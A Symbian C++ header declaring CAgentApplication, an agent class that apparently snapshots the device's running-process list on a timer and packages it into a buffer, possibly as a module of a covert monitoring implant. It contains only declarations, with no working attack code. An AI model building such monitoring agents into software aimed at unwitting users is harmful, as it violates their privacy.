/*
 * AgentApplication.h
 *
 *  Created on: 24/set/2010
 *      Author: Giovanna
 */

#ifndef AGENTAPPLICATION_H_
#define AGENTAPPLICATION_H_

#include "AbstractAgent.h"
#include <HT\TimeOutTimer.h>
#include <HT\Logging.h>

typedef struct TTimestamp
	{
	TInt32 iSec;     // seconds after the minute - [0,59] 
	TInt32 iMin;     // minutes after the hour - [0,59] 
	TInt32 iHour;    // hours since midnight - [0,23] 
	TInt32 iMonthDay;    // day of the month - [1,31] 
	TInt32 iMonth;     // months since January - [0,11] 
	TInt32 iYear;    // years since 1900 
	TInt32 iWeekDay;    // days since Sunday - [0,6] 
	TInt32 iYearDay;    // days since January 1 - [0,365] 
	TInt32 iDaylightSav;   // daylight savings time flag 
	} TTimestamp;


typedef struct TProcItem
	{
	TUint64	pUid;
	TName	name;
	} TProcItem;

// CLASS DECLARATION

/**
 *  CAgentApplication
 * 
 */
class CAgentApplication : public CAbstractAgent, public MTimeOutNotifier
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CAgentApplication();

	/**
	 * Two-phased constructor.
	 */
	static CAgentApplication* NewL(const TDesC8& params);

	/**
	 * Two-phased constructor.
	 */
	static CAgentApplication* NewLC(const TDesC8& params);

protected:
	// From AbstractQueueEndPoint
	virtual void StartAgentCmdL();
	virtual void StopAgentCmdL();
		
private:
	// From MTimeOutNotifier
    virtual void TimerExpiredL(TAny* src);
    
    // Get the TTimestamp struct
    void GetTimestamp(TTimestamp* aTimestamp);

    // Create the buffer with the process list
    HBufC8* GetListBufferL();
    
    // Swap the two proc lists
    void SwapLists();
        
	/**
	 * Constructor for performing 1st stage construction
	 */
	CAgentApplication();

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);

private:
	CTimeOutTimer* 	iTimer;
	TTimeIntervalSeconds 	iSecondsInterv;
	RArray<TProcItem>		iOldList;
	RArray<TProcItem>		iNewList;
	__FLOG_DECLARATION_MEMBER
	};



#endif /* AGENTAPPLICATION_H_ */
